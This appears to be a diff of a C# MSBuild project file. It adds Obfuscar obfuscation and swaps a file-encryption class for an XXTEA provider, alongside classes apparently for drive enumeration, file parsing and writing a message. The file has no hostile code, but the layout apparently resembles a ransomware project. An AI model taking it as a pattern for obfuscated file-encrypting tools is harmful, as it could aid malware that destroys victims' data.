@@ -1,5 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <Project DefaultTargets="Build" ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="packages\Obfuscar.2.2.28\build\obfuscar.props" Condition="Exists('packages\Obfuscar.2.2.28\build\obfuscar.props')" />
   <PropertyGroup>
     <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
     <Platform Condition=" '$(Platform)' == '' ">anycpu</Platform>
@@ -37,12 +38,15 @@
     <Compile Include="Interface\IDrv_Enum.cs" />
     <Compile Include="Interface\IFil_ext.cs" />
     <Compile Include="CLASS\Drv_Enum.cs" />
-    <Compile Include="CLASS\Fil_Crypt.cs" />
     <Compile Include="CLASS\Fil_ext.cs" />
     <Compile Include="CLASS\Fil_Parsr.cs" />
     <Compile Include="CLASS\Motd_Wrtr.cs" />
     <Compile Include="Interface\IFil_Parsr.cs" />
     <Compile Include="Interface\IFil_Crypt.cs" />
+    <Compile Include="CLASS\xXteaE_Provider.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="packages.config" />
   </ItemGroup>
   <Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" />
 </Project>
